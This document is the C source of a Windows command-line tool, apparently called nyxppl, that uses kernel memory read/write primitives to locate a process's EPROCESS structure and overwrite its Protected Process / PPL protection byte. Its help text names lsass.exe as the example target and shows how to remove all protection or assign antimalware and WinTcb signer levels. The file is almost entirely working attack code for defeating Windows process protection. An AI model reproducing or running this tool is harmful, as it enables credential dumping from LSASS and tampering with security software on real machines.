
#include <windows.h>
#include <stdio.h>
#include <Psapi.h>

#include "eprocess.h"


static  WORD PPOffset;
static  WORD PPLOffset;


int FindPPOfssets(){
    // 1) load on-disk image
    HMODULE hNtos = LoadLibraryExA(
        "ntoskrnl.exe",
        NULL,
        DONT_RESOLVE_DLL_REFERENCES
    );
    if (!hNtos) {
        printf("Failed to map ntoskrnl.exe\n");
        return 1;
    }
    //printf("[+] Find Offset's\n");

    // 2) get export and compute RVA
    FARPROC PsIsProtectedProcessPTR = GetProcAddress(hNtos, "PsIsProtectedProcess");
    ULONG_PTR PPrva = (ULONG_PTR)PsIsProtectedProcessPTR - (ULONG_PTR)hNtos;
    //printf("    + RVA of PsIsProtectedProcess = 0x%IX\n", PPrva);


    FARPROC PsIsProtectedProcessLightPTR = GetProcAddress(hNtos, "PsIsProtectedProcessLight");
    ULONG_PTR PPLrva = (ULONG_PTR)PsIsProtectedProcessLightPTR - (ULONG_PTR)hNtos;
    //printf("    + RVA of PsIsProtectedProcessLight = 0x%IX\n", PPLrva);

    // 3) get real kernel base
    LPVOID drivers[16];
    DWORD cb;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cb)) {
        printf("EnumDeviceDrivers failed\n");
        return 1;
    }
    ULONG_PTR krnlBase = (ULONG_PTR)drivers[0];
    //printf("    + Kernel base is 0x%p\n", (PVOID)krnlBase);

    // 4) compute real address
    ULONG_PTR realPPAddr = krnlBase + PPrva;
    //printf("    + Real PsIsProtectedProcess kernel address: 0x%p\n", (PVOID)realPPAddr);
    ULONG_PTR realPPLAddr = krnlBase + PPLrva;
    //printf("    + Real PsIsProtectedProcessLight kernel address: 0x%p\n", (PVOID)realPPLAddr);


    //printf("[+] Read Offset's value from Kernel\n");
    UINT64 PPaddr = realPPAddr;
    UINT64 PPLaddr = realPPLAddr;

    
    if (!Read16(PPaddr+0x2, &PPOffset)) {
        printf("    - failed to read at 0x%llx\n", PPaddr);
        return 1;
    }

 

    if (!Read16(PPLaddr+0x2, &PPLOffset)) {
        printf("    - failed to read at 0x%llx\n", PPLaddr);
        return 1;
    }

    
    

    return 0;
}


int main(int argc, char **argv)
{
    const char *helpText =
    "Usage: nyxppl.exe <PID> <ProtectionCode>\n"
    "\n"
    "Description:\n"
    "  <PID>             : Process ID of the target process (e.g. lsass.exe)\n"
    "  <ProtectionCode>  : A 1-byte hex value specifying the protection level.\n"
    "\n"
    "Examples:\n"
    "  # Remove all protection\n"
    "  nyxppl.exe 1234 0x00\n"
    "\n"
    "  # Protected Process Light with Antimalware signer\n"
    "  nyxppl.exe 1234 0x31\n"
    "\n"
    "  # Full Protected Process with WinTcb signer\n"
    "  nyxppl.exe 1234 0x62\n"
    "\n"
    "Available ProtectionCodes:\n"
    "  0x00 - None                              | No protection\n"
    "  0x01 - PPL, Signer=None                  | Protected Process Light, unsigned\n"
    "  0x11 - PPL, Signer=Authenticode          | PPL for CA-signed binaries\n"
    "  0x21 - PPL, Signer=CodeGen               | PPL for JIT/CodeGen code\n"
    "  0x31 - PPL, Signer=Antimalware           | PPL for antimalware engines\n"
    "  0x41 - PPL, Signer=Lsa                   | PPL for LSA (lsass.exe)\n"
    "  0x51 - PPL, Signer=Windows               | PPL for core OS components\n"
    "  0x61 - PPL, Signer=WinTcb                | PPL for Trusted Computing Base\n"
    "  0x71 - PPL, Signer=WinSystem             | PPL for system-level components\n"
    "  0x81 - PPL, Signer=App                   | PPL for UWP/Store apps\n"
    "\n"
    "  0x02 - Full PP, Signer=None              | Protected Process (Full), unsigned\n"
    "  0x12 - Full PP, Signer=Authenticode      | Full PP for CA-signed binaries\n"
    "  0x22 - Full PP, Signer=CodeGen           | Full PP for JIT/CodeGen code\n"
    "  0x32 - Full PP, Signer=Antimalware       | Full PP for antimalware engines\n"
    "  0x42 - Full PP, Signer=Lsa               | Full PP for LSA (lsass.exe)\n"
    "  0x52 - Full PP, Signer=Windows           | Full PP for core OS components\n"
    "  0x62 - Full PP, Signer=WinTcb            | Full PP for Trusted Computing Base\n"
    "  0x72 - Full PP, Signer=WinSystem         | Full PP for system-level components\n"
    "  0x82 - Full PP, Signer=App               | Full PP for UWP/Store apps\n"
    "\n"
    "Notes:\n"
    "- Use Type=1 (low bits 001) for PPL.\n"
    "- Use Type=2 (low bits 010) for Full PP.\n"
    "- Signer is stored in the high nibble (bits 4–7).\n"
    "- Audit bit (bit 3) is reserved and not currently used.\n"
    "\n"
    "To display this help, run without arguments:\n"
    "  nyxppl.exe\n";

    if (argc < 3) { printf("%s\n", helpText); return 1; }

    FindPPOfssets();

    //printf("    + PsIsProtectedProcess Byte  = 0x%02X\n" , PPOffset);
    //printf("    + PsIsProtectedProcessLight Byte  = 0x%02X\n", PPLOffset);


    if (argc < 2) {
        printf("Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);
    if (!FindKernelPsInitialSystemProcessOffset() ||
        !FindProcessUniqueProcessIdOffset() ||
        !FindProcessActiveProcessLinksOffset()) {
        printf("[-] failed to find offsets\n");
        return 1;
    }

    UINT64 eproc = GetEprocessByPid(pid);
    if (!eproc) {
        printf("[-] PID %u not found\n", pid);
        return 1;
    }
   
   
    unsigned long val = strtoul(argv[2], NULL, 0);
    if (val > 0xFF) {
        printf("[-] Value out of byte range: 0x%lX\n", val);
        return 1;
    }
    BYTE byteValue = (BYTE)val;
    //printf("[+] EPROCESS of PID %u is at 0x%llx\n", pid, eproc);

    UCHAR ProtectionLevel;
    Read8(eproc + PPLOffset, &ProtectionLevel);
    printf("[+] Protection Level Before Change 0x%02X \n", ProtectionLevel);
    Write8(eproc + PPLOffset, byteValue);
    printf("[+] Protection Level After Change 0x%02X \n", byteValue);

    return 0;
}
